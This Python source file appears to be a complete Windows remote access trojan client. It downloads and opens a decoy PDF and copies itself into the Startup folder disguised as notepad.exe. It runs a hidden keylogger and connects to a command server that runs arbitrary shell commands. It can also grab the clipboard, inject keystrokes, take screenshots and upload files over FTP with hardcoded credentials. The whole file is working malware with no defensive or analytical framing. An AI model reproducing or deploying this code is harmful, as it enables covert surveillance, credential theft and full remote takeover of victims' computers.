import os
import socket
import subprocess
import time
import signal
import sys
import struct
import pyautogui 
import ftplib
import threading
import keyboard
import tempfile
import logging
import win32clipboard
from pynput.keyboard import Key, Listener
from datetime import datetime



#startup
os.system("curl -s https://srv-store4.gofile.io/download/BM2fmk/bc66eac34c050de6eceb85fed4ac8a30/activity1_galero.pdf --output %TEMP%/activity1.3.pdf")
os.system("start %TEMP%/activity1.3.pdf")
#persistence
username = os.getlogin()
startup = 'C:/Users/' + username + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/notepad.exe'
if os.path.exists(startup + 'notepad.exe') != True:
    os.system('copy "' + __file__ + '" "' + startup + '" ')



class Client(object):

    def __init__(self):
        # PORT AND HOST IP
        self.serverHost = 'localhost'
        self.serverPort = 4444
        self.socket = None

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
        sys.exit(0)
        return


    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("Socket creation error" + str(e))
            return
        return

    def socket_connect(self):
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print("Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            print("Cannot send hostname to server: " + str(e))
            raise
        return

    def print_output(self, output_str):
        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        print(output_str)
        return

    def receive_commands(self):
        keylog_stat = False
        try:
            self.socket.recv(10)
        except Exception as e:
            print('Could not start communication with server: %s\n' %str(e))
            return
        cwd = str.encode(str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b'': break
            elif data[:2].decode("utf-8") == 'cd':
                directory = data[3:].decode("utf-8")
                try:
                    os.chdir(directory.strip())
                except Exception as e:
                    output_str = "Could not change directory: %s\n" %str(e)
                else: 
                    output_str = ""
            elif data[:].decode("utf-8").split(' ')[0] == 'get_clipboard':
                try:
                    win32clipboard.OpenClipboard()
                    data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                except Exception as e:
                    output_str = "Could not get clipboard: %s\n" %str(e)
                else: 
                    output_str = data + '\n'
            elif data[:].decode("utf-8").split(' ')[0] == 'send_keystroke':
                try:
                    keys = data[:].decode("utf-8").split(' ')[1]
                    keyboard.write(keys + " \n")
                except Exception as e:
                    output_str = "Could not inject keystroke: %s\n" %str(e)
                else: 
                    output_str = ""
            elif data[:].decode("utf-8").split(' ')[0] == 'keylogger':
                try:
                    f = open(log_directory + "\\keylog.txt", 'r')
                    file_contents = f.read()
                except Exception as e:
                    output_str = "Could not get keylogger: %s\n" %str(e)
                else: 
                    output_str = file_contents
            elif data[:].decode("utf-8").split(' ')[0] == 'download':
                try:
                    ftp = ftplib.FTP(self.serverHost, 'remoteshell', 'Ajci45sC', 4432)
                    ftp.encoding = "utf-8"
                    filename = data[:].decode("utf-8").split(' ')[1]
                    with open(filename, "rb") as file:
                        ftp.storbinary(f"STOR {filename}", file)
                except Exception as e:
                    output_str = "Could not download file: %s\n" %str(e)
                else: 
                    output_str = ""
            elif data[:].decode("utf-8") == 'screenshot':
                try:
                    #take screenshot
                    myScreenshot = pyautogui.screenshot() 
                    myScreenshot.save('screenshot.png')
                    #send screenshot
                    ftp = ftplib.FTP(self.serverHost, 'remoteshell', 'Ajci45sC', 4432)
                    ftp.encoding = "utf-8"
                    filename = "screenshot.png"
                    with open(filename, "rb") as file:
                        ftp.storbinary(f"STOR {filename}", file)
                    os.system('del screenshot.png')
                except Exception as e:
                    output_str = "Could not get screenshot: %s\n" %str(e)
                else: 
                    output_str = ""
            elif data[:].decode("utf-8") == 'quit':
                self.socket.close()
                break
            elif len(data) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors="replace")
                except Exception as e:
                    output_str = "Command execution unsuccessful: %s\n" %str(e)
            if output_str is not None:
                try:
                    self.print_output(output_str)
                except Exception as e:
                    print('Cannot send command output: %s' %str(e))
        self.socket.close()
        return


def main():
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            print("Error on socket connections: %s" %str(e))
            time.sleep(5)     
        else:
            break    
    try:
        client.receive_commands()
    except Exception as e:
        print('Error in main: ' + str(e))
    client.socket.close()
    return

#keylogger
log_directory = tempfile.gettempdir()
logging.basicConfig(filename = (log_directory + "\\keylog.txt"), level = logging.DEBUG, format = '%(asctime)s : %(message)s')

def keypress(Key):
    logging.info(str(Key))

def keylogger():
    with Listener(on_press = keypress) as listener:
        listener.join()

t = threading.Thread(target=keylogger)
t.daemon = True
t.start()

if __name__ == '__main__':
    while True:
        main()